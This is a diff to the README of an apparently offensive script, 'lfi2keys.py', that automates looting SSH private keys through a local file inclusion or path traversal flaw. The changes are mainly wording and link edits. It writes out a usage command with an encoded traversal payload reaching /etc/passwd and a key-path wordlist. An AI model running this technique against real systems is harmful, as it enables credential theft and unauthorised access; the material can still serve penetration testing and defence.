@@ -1,8 +1,8 @@
 # Usage
-Provide the full path of the affected URL with the LFI/ path traversal vulnerability and an private key [wordlist](https://github.com/PinoyWH1Z/SSH-Private-Key-Looting-Wordlists)
+Provide the full path of the affected endpoint with the LFI/ path traversal vulnerability with the `/etc/passwd` file and a private key [wordlist](https://github.com/PinoyWH1Z/SSH-Private-Key-Looting-Wordlists).
 
 ```bash
-┌──(kali㉿DC07 | 2025-02-12 19:13:43)-[~]
+┌──(kali㉿DC07 | 2025-02-12 00:13:37)-[~]
 └─$ python3 lfi2keys.py -u https://127.0.0.1/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd -l /usr/share/wordlists/ssh-key-looting/ssh-priv-key-loot-medium.txt   
 
   _    ___ ___ ___ _  _______   _____ 
@@ -27,4 +27,4 @@ LFI to SSH Private Keys - Automated Looting Script
 ```
 
 # Credits
-- PinoyWH1Z for his [wordlists](https://github.com/PinoyWH1Z/SSH-Private-Key-Looting-Wordlists)
+- [PinoyWH1Z](https://github.com/PinoyWH1Z) for his [wordlists](https://github.com/PinoyWH1Z/SSH-Private-Key-Looting-Wordlists)
